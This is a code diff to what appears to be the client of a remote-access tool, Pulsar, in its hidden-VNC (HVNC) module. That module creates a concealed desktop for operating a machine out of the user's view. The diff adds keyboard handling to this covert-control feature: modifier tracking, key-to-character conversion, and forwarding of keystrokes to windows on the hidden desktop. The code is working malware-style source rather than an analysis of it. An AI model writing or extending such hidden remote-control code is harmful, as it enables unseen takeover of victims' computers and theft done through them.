@@ -102,6 +102,20 @@ namespace Pulsar.Client.Helper.HVNC
         [DllImport("user32.dll")]
         private static extern IntPtr GetDesktopWindow();
 
+        [DllImport("user32.dll")]
+        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
+
+        [DllImport("user32.dll")]
+        private static extern short GetKeyState(int nVirtKey);
+
+        [DllImport("user32.dll")]
+        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
+            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] System.Text.StringBuilder pwszBuff, 
+            int cchBuff, uint wFlags);
+
+        [DllImport("user32.dll")]
+        private static extern bool GetKeyboardState(byte[] lpKeyState);
+
         private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
 
         #endregion
@@ -162,6 +176,17 @@ namespace Pulsar.Client.Helper.HVNC
         private const int SW_SHOWMAXIMIZED = 3;
         private const int SW_RESTORE = 9;
 
+        private const int VK_SHIFT = 0x10;
+        private const int VK_CONTROL = 0x11;
+        private const int VK_MENU = 0x12; // Alt key
+        private const int VK_LSHIFT = 0xA0;
+        private const int VK_RSHIFT = 0xA1;
+        private const int VK_LCONTROL = 0xA2;
+        private const int VK_RCONTROL = 0xA3;
+        private const int VK_LMENU = 0xA4; // Left Alt
+        private const int VK_RMENU = 0xA5; // Right Alt
+        private const int VK_CAPITAL = 0x14; // Caps Lock
+
         #endregion
 
         #region Fields and Properties
@@ -173,6 +198,11 @@ namespace Pulsar.Client.Helper.HVNC
         private IntPtr windowToMove = IntPtr.Zero;
         private IntPtr workingWindow = IntPtr.Zero;
         private static readonly object syncLock = new object();
+
+        private bool isShiftPressed = false;
+        private bool isControlPressed = false;
+        private bool isAltPressed = false;
+        private bool isCapsLockOn = false;
 
         /// <summary>
         /// Gets the desktop handle.
@@ -196,6 +226,8 @@ namespace Pulsar.Client.Helper.HVNC
                 desktopHandle = CreateDesktop(desktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
             }
             this.Desktop = desktopHandle;
+            
+            InitializeModifierKeyStates();
         }
 
         /// <summary>
@@ -205,6 +237,287 @@ namespace Pulsar.Client.Helper.HVNC
         {
             CloseDesktop(this.Desktop);
             GC.Collect();
+        }
+
+        #endregion
+
+        #region Keyboard Helper Methods
+
+        /// <summary>
+        /// Initializes the modifier key states by checking the current system state.
+        /// </summary>
+        private void InitializeModifierKeyStates()
+        {
+            isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+            isControlPressed = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
+            isAltPressed = (GetKeyState(VK_MENU) & 0x8000) != 0;
+            isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+        }
+
+        /// <summary>
+        /// Handles keyboard input with proper modifier tracking and character conversion.
+        /// </summary>
+        /// <param name="msg">The keyboard message</param>
+        /// <param name="wParam">The wParam containing the virtual key code</param>
+        /// <param name="lParam">The original lParam</param>
+        /// <param name="targetWindow">The target window to send messages to</param>
+        private void HandleKeyboardInput(uint msg, IntPtr wParam, IntPtr lParam, IntPtr targetWindow)
+        {
+            int virtualKey = wParam.ToInt32();
+            
+            UpdateModifierKeyState(msg, virtualKey);
+            
+            if (msg == WM_KEYDOWN)
+            {
+                if (IsModifierKey(virtualKey))
+                {
+                    IntPtr modifierLParam = BuildKeyboardLParam(msg, wParam);
+                    PostMessage(targetWindow, msg, wParam, modifierLParam);
+                    return;
+                }
+                
+                char[] chars = VirtualKeyToChar(virtualKey);
+                bool isPrintableChar = (chars != null && chars.Length > 0 && chars[0] != '\0');
+                
+                if (isPrintableChar)
+                {
+                    IntPtr charLParam = BuildKeyboardLParam(WM_CHAR, wParam);
+                    foreach (char ch in chars)
+                    {
+                        if (ch != '\0')
+                        {
+                            PostMessage(targetWindow, WM_CHAR, new IntPtr(ch), charLParam);
+                        }
+                    }
+                }
+                else
+                {
+                    IntPtr properLParam = BuildKeyboardLParam(msg, wParam);
+                    PostMessage(targetWindow, msg, wParam, properLParam);
+                }
+            }
+            else if (msg == WM_KEYUP)
+            {
+                IntPtr properLParam = BuildKeyboardLParam(msg, wParam);
+                PostMessage(targetWindow, msg, wParam, properLParam);
+            }
+            else if (msg == WM_CHAR)
+            {
+                PostMessage(targetWindow, msg, wParam, lParam);
+            }
+        }
+
+        /// <summary>
+        /// Updates the internal modifier key state tracking.
+        /// </summary>
+        /// <param name="msg">The keyboard message</param>
+        /// <param name="virtualKey">The virtual key code</param>
+        private void UpdateModifierKeyState(uint msg, int virtualKey)
+        {
+            bool keyDown = (msg == WM_KEYDOWN);
+            
+            switch (virtualKey)
+            {
+                case VK_SHIFT:
+                case VK_LSHIFT:
+                case VK_RSHIFT:
+                    isShiftPressed = keyDown;
+                    break;
+                    
+                case VK_CONTROL:
+                case VK_LCONTROL:
+                case VK_RCONTROL:
+                    isControlPressed = keyDown;
+                    break;
+                    
+                case VK_MENU:
+                case VK_LMENU:
+                case VK_RMENU:
+                    isAltPressed = keyDown;
+                    break;
+                    
+                case VK_CAPITAL:
+                    if (keyDown)
+                    {
+                        isCapsLockOn = !isCapsLockOn;
+                    }
+                    break;
+            }
+        }
+
+        /// <summary>
+        /// Converts a virtual key to its character representation considering modifier states.
+        /// </summary>
+        /// <param name="virtualKey">The virtual key code</param>
+        /// <returns>Array of characters, or null if not a printable character</returns>
+        private char[] VirtualKeyToChar(int virtualKey)
+        {
+            if (IsModifierKey(virtualKey) || IsNonPrintableKey(virtualKey))
+            {
+                return null;
+            }
+            
+            byte[] keyboardState = new byte[256];
+            
+            if (isShiftPressed)
+            {
+                keyboardState[VK_SHIFT] = 0x80;
+            }
+            
+            if (isControlPressed)
+            {
+                keyboardState[VK_CONTROL] = 0x80;
+            }
+            
+            if (isAltPressed)
+            {
+                keyboardState[VK_MENU] = 0x80;
+            }
+            
+            if (isCapsLockOn)
+            {
+                keyboardState[VK_CAPITAL] = 0x01;
+            }
+            
+
+            var buffer = new StringBuilder(64);
+            uint scanCode = MapVirtualKey((uint)virtualKey, 0);
+            
+            int result = ToUnicode((uint)virtualKey, scanCode, keyboardState, buffer, buffer.Capacity, 0);
+            
+            if (result > 0)
+            {
+                return buffer.ToString().Substring(0, result).ToCharArray();
+            }
+            
+            return null;
+        }
+
+        /// <summary>
+        /// Determines if a virtual key is a modifier key.
+        /// </summary>
+        /// <param name="virtualKey">The virtual key code</param>
+        /// <returns>True if the key is a modifier key</returns>
+        private bool IsModifierKey(int virtualKey)
+        {
+            switch (virtualKey)
+            {
+                case VK_SHIFT:
+                case VK_LSHIFT:
+                case VK_RSHIFT:
+                case VK_CONTROL:
+                case VK_LCONTROL:
+                case VK_RCONTROL:
+                case VK_MENU:
+                case VK_LMENU:
+                case VK_RMENU:
+                case VK_CAPITAL:
+                    return true;
+                default:
+                    return false;
+            }
+        }
+
+        /// <summary>
+        /// Determines if a virtual key is a non-printable key (function keys, arrows, etc.).
+        /// </summary>
+        /// <param name="virtualKey">The virtual key code</param>
+        /// <returns>True if the key is non-printable</returns>
+        private bool IsNonPrintableKey(int virtualKey)
+        {
+            if (virtualKey >= 0x70 && virtualKey <= 0x7B) return true;
+            
+            switch (virtualKey)
+            {
+                case 0x21: // VK_PRIOR (Page Up)
+                case 0x22: // VK_NEXT (Page Down)
+                case 0x23: // VK_END
+                case 0x24: // VK_HOME
+                case 0x25: // VK_LEFT
+                case 0x26: // VK_UP
+                case 0x27: // VK_RIGHT
+                case 0x28: // VK_DOWN
+                case 0x2D: // VK_INSERT
+                case 0x2E: // VK_DELETE
+                case 0x5B: // VK_LWIN
+                case 0x5C: // VK_RWIN
+                case 0x5D: // VK_APPS
+                case 0x91: // VK_SCROLL
+                case 0x90: // VK_NUMLOCK
+                case 0x0D: // VK_RETURN (Enter)
+                case 0x1B: // VK_ESCAPE
+                case 0x09: // VK_TAB
+                case 0x08: // VK_BACK (Backspace)
+                    return true;
+                default:
+                    return false;
+            }
+        }
+
+        /// <summary>
+        /// Builds the appropriate lParam value for keyboard messages.
+        /// </summary>
+        /// <param name="message">The keyboard message (WM_KEYDOWN, WM_KEYUP, WM_CHAR)</param>
+        /// <param name="wParam">The wParam containing the virtual key code</param>
+        /// <returns>The properly formatted lParam for the keyboard message</returns>
+        private IntPtr BuildKeyboardLParam(uint message, IntPtr wParam)
+        {
+            int vk = wParam.ToInt32();
+            uint scanCode = MapVirtualKey((uint)vk, 0);
+            
+            int lParam = 0;
+            
+            lParam |= 1;
+            
+            lParam |= (int)(scanCode << 16);
+            
+            if (IsExtendedKey(vk))
+            {
+                lParam |= (1 << 24);
+            }
+            
+            if (message == WM_KEYUP)
+            {
+                lParam |= (1 << 30);
+                lParam |= (1 << 31);
+            }
+            
+            return new IntPtr(lParam);
+        }
+
+        /// <summary>
+        /// Determines if a virtual key code represents an extended key.
+        /// </summary>
+        /// <param name="virtualKey">The virtual key code</param>
+        /// <returns>True if the key is an extended key</returns>
+        private bool IsExtendedKey(int virtualKey)
+        {
+            switch (virtualKey)
+            {
+                case 0x21: // VK_PRIOR (Page Up)
+                case 0x22: // VK_NEXT (Page Down)
+                case 0x23: // VK_END
+                case 0x24: // VK_HOME
+                case 0x25: // VK_LEFT
+                case 0x26: // VK_UP
+                case 0x27: // VK_RIGHT
+                case 0x28: // VK_DOWN
+                case 0x2D: // VK_INSERT
+                case 0x2E: // VK_DELETE
+                case 0x5B: // VK_LWIN
+                case 0x5C: // VK_RWIN
+                case 0x5D: // VK_APPS
+                case 0xA0: // VK_LSHIFT (when differentiated from VK_SHIFT)
+                case 0xA1: // VK_RSHIFT
+                case 0xA2: // VK_LCONTROL
+                case 0xA3: // VK_RCONTROL
+                case 0xA4: // VK_LMENU (Left Alt)
+                case 0xA5: // VK_RMENU (Right Alt)
+                case 0x91: // VK_SCROLL
+                    return true;
+                default:
+                    return false;
+            }
         }
 
         #endregion
@@ -370,15 +683,7 @@ namespace Pulsar.Client.Helper.HVNC
                 {
                     if (workingWindow != IntPtr.Zero)
                     {
-                        // Example: build appropriate lParam for key up with scan code
-                        IntPtr keyMapParam = IntPtr.Zero;
-                        if (msg == WM_KEYUP)
-                        {
-                            int scanCode = wParam.ToInt32();
-                            keyMapParam = new IntPtr((scanCode << 16) | 0xC0000000);
-                        }
-
-                        PostMessage(workingWindow, msg, wParam, keyMapParam);
+                        HandleKeyboardInput(msg, wParam, lParam, workingWindow);
                     }
                 }
             }
